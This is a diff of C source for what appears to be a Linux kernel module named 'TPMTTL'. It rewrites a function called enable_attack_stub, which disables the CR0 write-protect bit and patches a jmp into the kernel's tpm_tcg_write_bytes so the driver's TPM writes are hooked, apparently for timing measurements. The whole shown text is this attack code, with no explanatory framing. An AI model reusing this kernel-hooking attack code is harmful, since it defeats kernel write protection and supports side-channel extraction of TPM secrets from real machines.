@@ -78,54 +78,23 @@ static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 
 unsigned long long tscrequest[1000] = {0};
 unsigned long long requestcnt = 0;
 
-// static void enable_attack_stub()
-// {
-//   requestcnt = 0;
-//   unsigned int target_addr;
-
-//   unsigned long flags;
-//   preempt_disable();
-//   raw_local_irq_save(flags);
-//   write_cr0(read_cr0() & (~X86_CR0_WP));
-
-//   target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
-//   jmp_stub[1] = ((char*)&target_addr)[0];
-//   jmp_stub[2] = ((char*)&target_addr)[1];
-//   jmp_stub[3] = ((char*)&target_addr)[2];
-//   jmp_stub[4] = ((char*)&target_addr)[3];
-//   memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
-
-//   write_cr0(read_cr0() | X86_CR0_WP); 
-//   raw_local_irq_restore(flags);
-//   preempt_enable();
-
-//   printk("TPMTTL: ENABLED\n");
-// }
-
 static void enable_attack_stub()
 {
-    requestcnt = 0;
-    unsigned int target_addr;
-    unsigned long addr = (unsigned long)ptpm_tcg_write_bytes;
-    unsigned long page_start = addr & PAGE_MASK;
-    unsigned long flags;
+  requestcnt = 0;
+  unsigned int target_addr;
 
-    preempt_disable();
-    raw_local_irq_save(flags);
-    set_memory_rw(page_start, 1);
+  write_cr0(read_cr0() & (~X86_CR0_WP));
 
-    target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
-    jmp_stub[1] = ((char*)&target_addr)[0];
-    jmp_stub[2] = ((char*)&target_addr)[1];
-    jmp_stub[3] = ((char*)&target_addr)[2];
-    jmp_stub[4] = ((char*)&target_addr)[3];
-    memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
+  target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
+  jmp_stub[1] = ((char*)&target_addr)[0];
+  jmp_stub[2] = ((char*)&target_addr)[1];
+  jmp_stub[3] = ((char*)&target_addr)[2];
+  jmp_stub[4] = ((char*)&target_addr)[3];
+  memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
 
-    set_memory_ro(page_start, 1);
-    raw_local_irq_restore(flags);
-    preempt_enable();
+  write_cr0(read_cr0() | X86_CR0_WP); 
 
-    printk("TPMTTL: ENABLED\n");
+  printk("TPMTTL: ENABLED\n");
 }
 
 
